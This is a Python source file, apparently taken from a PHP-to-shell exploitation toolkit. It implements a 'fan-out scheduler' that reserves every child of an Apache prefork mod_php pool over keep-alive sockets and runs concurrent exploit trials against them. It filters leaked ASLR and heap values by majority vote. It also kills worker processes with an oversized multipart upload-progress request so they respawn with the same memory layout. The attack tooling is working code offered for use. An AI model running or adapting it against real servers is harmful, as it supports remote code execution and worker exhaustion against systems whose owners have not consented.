#!/usr/bin/env python3
# INDEX: fan-out scheduler reserving whole prefork pool | apache | prefork mpm
"""Bounded-pool fan-out scheduler for prefork mod_php targets.

RESERVES a whole Apache prefork pool instead of collapsing it onto one child:
connecting W keep-alive sockets pins W distinct idle children (one per socket),
with no request bytes sent until every child is reserved. A wave then fires W
INDEPENDENT trials concurrently (one per child). Siblings are forks of the same
master and share its ASLR bases, so W children give W independent heap/groom
rolls at one shared, cross-checkable base.

Provides:
  * W independent trials per wave => per-wave success = 1 - (1-p)^W.
  * Consensus voting across a wave (Counter.most_common) to filter a corrupted
    leak a single trial cannot cross-check.
  * Per-worker kill+respawn (reset_worker): spoil a child's allocator history and
    make the master re-fork a clean child with the SAME ASLR, so a reserved slot
    is reusable across staged primitives.

Precondition: prefork MPM (one connection == one child for the connection's
life). Fan-out gives coverage/consensus/overhead wins, not raw server throughput
(concurrent CPU/memory-bound groom bodies do not run faster on loopback).

Ported from the dimasma0305/php2shell run_prefork_wave_preapp / open_wave /
leak_wave / reset_wave scheduler. stdlib only (socket, threading,
concurrent.futures).
"""
import socket
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor


class PinnedConn:
    """One keep-alive socket pinned to one idle prefork child. Connecting is what
    reserves the child; nothing is sent until the caller fires a trial."""

    def __init__(self, host, port, timeout=30.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)

    def request(self, raw, read_limit=1 << 20):
        """Send a prebuilt raw HTTP/1.1 request (keep-alive) and return the full
        raw response (status line + headers + body up to read_limit)."""
        self.sock.sendall(raw)
        buf = bytearray()
        while b"\r\n\r\n" not in buf:
            c = self.sock.recv(65536)
            if not c:
                return bytes(buf)
            buf.extend(c)
        head, _, rest = bytes(buf).partition(b"\r\n\r\n")
        clen = None
        chunked = False
        for line in head.split(b"\r\n"):
            low = line.lower()
            if low.startswith(b"content-length:"):
                clen = int(line.split(b":", 1)[1].strip())
            elif low.startswith(b"transfer-encoding:") and b"chunked" in low:
                chunked = True
        if clen is not None:
            while len(rest) < clen and len(rest) < read_limit:
                c = self.sock.recv(65536)
                if not c:
                    break
                rest += c
        elif chunked:
            while b"0\r\n\r\n" not in rest and len(rest) < read_limit:
                c = self.sock.recv(65536)
                if not c:
                    break
                rest += c
        return head + b"\r\n\r\n" + rest[:read_limit]

    def get(self, path, read_limit=1 << 20):
        raw = (f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
               f"Connection: keep-alive\r\n\r\n").encode("latin1")
        return self.request(raw, read_limit)

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


class PreforkPool:
    """Bounded-pool fan-out scheduler. Reserve W children, run W concurrent
    trials per wave, take consensus, and kill+respawn spoiled children."""

    def __init__(self, host, port, workers=10, settle=0.2):
        self.host = host
        self.port = port
        self.workers = workers
        self.settle = settle

    def reserve(self, count=None):
        """Open `count` keep-alive sockets, each pinning one idle child. Connect
        all first (reserve the whole set) before any trial runs, so no two trials
        share a child. Returns the transports; caller closes them (or close_wave)."""
        count = self.workers if count is None else count
        conns = []
        try:
            for _ in range(count):
                conns.append(PinnedConn(self.host, self.port))
            time.sleep(self.settle)
            return conns
        except Exception:
            for c in conns:
                c.close()
            raise

    @staticmethod
    def close_wave(conns):
        for c in conns:
            c.close()

    def wave(self, trial, count=None):
        """Reserve a wave and run trial(conn, index) across every reserved child
        CONCURRENTLY. Returns [(index, result, error)], one per child. A trial
        raising is captured per-child (each child is an independent trial)."""
        count = self.workers if count is None else count
        conns = self.reserve(count)

        def invoke(i):
            try:
                return i, trial(conns[i], i), None
            except Exception as exc:  # noqa: BLE001 - per-child isolation
                return i, None, f"{type(exc).__name__}: {exc}"

        try:
            with ThreadPoolExecutor(max_workers=count) as pool:
                results = list(pool.map(invoke, range(count)))
        finally:
            self.close_wave(conns)
        return results

    @staticmethod
    def consensus(results, min_votes=1):
        """Modal value across a wave's successful results, or None: discard
        non-consensus leaks, keep the majority base."""
        values = [r for _, r, err in results if err is None and r]
        if not values:
            return None, 0, 0
        value, votes = Counter(values).most_common(1)[0]
        if votes < min_votes:
            return None, votes, len(values)
        return value, votes, len(values)

    def leak_wave(self, trial, retries=3, min_votes=1):
        """Run leak waves until one yields a consensus value or retries run out.
        Returns (value, votes, total) from the winning wave, else (None, 0, 0)."""
        for _ in range(retries):
            results = self.wave(trial)
            value, votes, total = self.consensus(results, min_votes)
            if value:
                return value, votes, total
            time.sleep(self.settle)
        return None, 0, 0

    def reset_worker(self, conn):
        """Kill the child behind `conn` so the master re-forks a clean one with
        the same ASLR. A large multipart body (memory pressure) followed by an
        upload-progress session trigger spoils the child enough for Apache to
        retire it; the socket is closed after."""
        boundary = b"S" * 17
        big = b"B" * (16 * 1024 * 1024)
        body = bytearray()
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="big"\r\n\r\n'
        body += big + b"\r\n"
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        body += b"pwn\r\n"
        body += b"--" + boundary + b"--\r\n"
        raw = (f"POST / HTTP/1.1\r\nHost: {self.host}\r\n"
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
               ).encode("latin1") + bytes(body)
        try:
            conn.sock.sendall(raw)
            conn.sock.recv(4096)
        except OSError:
            pass
        finally:
            conn.close()
        time.sleep(self.settle)


def per_wave_success(p, w):
    """Probability at least one of W independent trials lands at per-trial rate p."""
    return 1.0 - (1.0 - p) ** w


if __name__ == "__main__":
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8093
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    pool = PreforkPool(host, port, workers)

    def pid_trial(conn, _i):
        resp = conn.get("/pid.php")
        body = resp.split(b"\r\n\r\n", 1)[-1].strip()
        return int(body) if body.isdigit() else None

    results = pool.wave(pid_trial)
    pids = [r for _, r, e in results if e is None and r]
    print(f"wave: {len(set(pids))} distinct children reserved -> {sorted(set(pids))}")
    val, votes, total = pool.consensus(results)
    print(f"consensus modal child: {val} ({votes}/{total} votes)")
